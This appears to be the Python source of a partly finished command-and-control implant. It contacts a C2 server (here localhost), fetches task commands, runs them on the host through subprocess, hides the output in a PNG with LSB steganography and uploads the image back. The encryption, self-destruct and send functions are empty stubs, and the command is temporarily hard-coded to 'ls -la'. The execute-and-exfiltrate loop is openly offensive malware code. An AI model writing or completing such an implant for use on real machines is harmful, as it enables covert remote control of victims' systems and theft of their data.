from Crypto.Cipher import AES
from stegano import lsb
import uuid
import requests
import json 
import subprocess
import time



url = "http://localhost:80/"
routes = {
    0 : url + "task", 
    1: url + "upload"
}

#Encryption of data 
def encrypt(plain_str): 
    pass

#Decryption of data 
def decrypt(msg, key): 

    pass 

#str is the encrypted string of data that needs to be hidden in a file. 
def mod_img(msg):
    path = "./images/"
    file_name = "safari-bird"
    encoded_img = lsb.hide(f"{path}{file_name}.png", msg) #we have to assume that we are in a writeable directory for this 
    encoded_img.save(f"{path}{file_name}-final.png")
    #Error Checking: 
    #print("[*] Revealed from image:")
    #print(lsb.reveal(f"{path}{file_name}-final.png"))
    return f"{path}{file_name}-final.png" 

#Execute command 
def exec(cmd): 
    print("[+] Executing command: %s" % cmd)
    cmd_lst = cmd.split()
    output = subprocess.run(cmd_lst, capture_output=True, text=True) #running command on host machine 
    result = output.stdout 
    print("[+] Result: %s" % result)
    return result 

#Sending output back to C2Server 
def send_output(result): 
    pass

#Called to clean up and destroy implant
def destroy(): 
    pass

#Setting up initial connection with C2 Server
def init(): 
    tries = 0
    while tries < 3: 
        print("[+] Contacting Server...")
        try:
            response = requests.get(url)
            print("[+] Connection Established...")
            print(response.text)
            return
        except Exception as e: 
            print("[-] Error in Contacting Server...")
            tries += 1
    print("[-] Failure in establishing connection.")
    destroy()
    exit(1) #If reached, server cannot be contacted, and must exit

#Gets task from GET request and executes 

def parse_json(response): 
    res_json = response.json()
    cmd = ""
    if res_json["msg"] == None: 
        print("[-] Error in parsing JSON.")
        cmd = "echo 0" #just doing this to handle error case 
    else:
        cmd = res_json["msg"]
    return cmd

if __name__ == '__main__':
    init()
    while True: 
        try: 
            #Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
            response = requests.get(routes[0]) 
            encrypted_cmd = parse_json(response) 
            cmd = decrypt(encrypted_cmd) 
            cmd = "ls -la"
            output = exec(cmd) 
            obf_img = mod_img(output)
            requests.post(routes[1], files={"file": open(obf_img,'rb')})
        except Exception as e: 
            """
            Options for handling query failure: 
                - self destruct immediately 
                - try 3 times, the exit if all fail
                - sleep and try again, etc.
            """
    


    